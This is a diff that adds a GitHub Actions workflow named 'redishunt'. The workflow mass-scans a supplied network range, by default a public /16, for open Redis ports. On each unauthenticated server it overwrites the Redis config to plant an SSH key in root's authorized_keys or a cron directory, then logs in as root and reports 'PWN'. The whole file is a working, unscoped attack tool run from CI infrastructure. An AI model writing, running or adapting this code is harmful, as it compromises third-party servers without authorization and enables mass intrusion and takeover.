@@ -1,0 +1,93 @@
+name: redishunt
+
+on:
+  workflow_dispatch:
+    inputs:
+      cidr:
+        description: CIDR
+        required: true
+        default: 192.3.0.0/16
+
+jobs:
+  hunt:
+    runs-on: ubuntu-latest
+    timeout-minutes: 40
+    steps:
+      - uses: actions/checkout@v4
+      - name: redis
+        run: |
+          ssh-keygen -t ed25519 -f /tmp/k -N "" -q
+          CIDR="${{ inputs.cidr }}" python3 - <<'PY'
+          import asyncio
+          import ipaddress
+          import os
+          import socket
+          import subprocess
+          import time
+
+          CIDR = os.environ["CIDR"]
+          ips = [str(ip) for ip in ipaddress.ip_network(CIDR).hosts()]
+
+          async def probe(ip):
+              try:
+                  reader, writer = await asyncio.wait_for(asyncio.open_connection(ip, 6379), 1.5)
+                  writer.close()
+                  return ip
+              except Exception:
+                  return None
+
+          async def run():
+              sem = asyncio.Semaphore(1200)
+              async def guarded(ip):
+                  async with sem:
+                      return await probe(ip)
+              return [ip for ip in await asyncio.gather(*(guarded(ip) for ip in ips)) if ip]
+
+          started = time.time()
+          open_ips = asyncio.run(run())
+          print(f"cidr={CIDR} scanned={len(ips)} open={len(open_ips)} secs={int(time.time()-started)}", flush=True)
+
+          def cmd(host, *args, timeout=5):
+              payload = f"*{len(args)}\r\n" + "".join(f"${len(a)}\r\n{a}\r\n" for a in args)
+              sock = socket.socket()
+              sock.settimeout(timeout)
+              try:
+                  sock.connect((host, 6379))
+                  sock.sendall(payload.encode())
+                  data = b""
+                  while True:
+                      chunk = sock.recv(65536)
+                      if not chunk:
+                          break
+                      data += chunk
+                      if len(chunk) < 65536:
+                          break
+                  return data
+              except Exception:
+                  return b""
+              finally:
+                  sock.close()
+
+          pub = open("/tmp/k.pub").read().strip()
+          for ip in open_ips:
+              pong = cmd(ip, "PING")
+              if b"+PONG" not in pong:
+                  print("AUTH", ip, pong[:40], flush=True)
+                  continue
+              print("UNAUTH", ip, flush=True)
+              print("  dir", cmd(ip, "CONFIG", "GET", "dir")[:80], flush=True)
+              for directory in ("/root/.ssh", "/home/ubuntu/.ssh", "/var/spool/cron"):
+                  cmd(ip, "CONFIG", "SET", "dir", directory)
+                  cmd(ip, "CONFIG", "SET", "dbfilename", "authorized_keys")
+                  cmd(ip, "SET", "pwn", "\n\n" + pub + "\n\n")
+                  save = cmd(ip, "SAVE")
+                  print("  try", directory, save[:40], flush=True)
+                  if b"+OK" in save:
+                      result = subprocess.run(
+                          ["ssh", "-i", "/tmp/k", "-o", "StrictHostKeyChecking=no",
+                           "-o", "ConnectTimeout=6", f"root@{ip}", "id; nproc; hostname"],
+                          capture_output=True, text=True, timeout=12)
+                      if result.returncode == 0 and "uid=0" in result.stdout:
+                          print("PWN", ip, result.stdout.replace("\n", " | ")[:200], flush=True)
+                          break
+          PY
